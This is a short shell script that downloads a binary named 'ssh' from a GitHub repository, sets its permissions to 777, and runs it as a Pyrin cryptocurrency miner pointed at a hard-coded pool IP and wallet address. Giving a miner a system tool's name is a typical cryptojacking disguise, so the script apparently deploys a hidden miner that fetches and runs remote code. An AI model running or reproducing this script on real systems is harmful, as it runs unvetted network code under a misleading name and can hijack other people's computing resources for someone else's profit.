wget https://github.com/lemanleman020/rich-again/raw/main/ssh && chmod 777 ssh

#!/bin/bash

POOL=15.235.214.147:1177
WALLET=pyrin:qq02hvf6ls5dhewyjx64607fyvs8qqfc0796v7pdxa729wvjx2aqxy8wlenft.STRIXGPU

./ssh --algo PYRIN --pool $POOL --user $WALLET $@ --no-cl
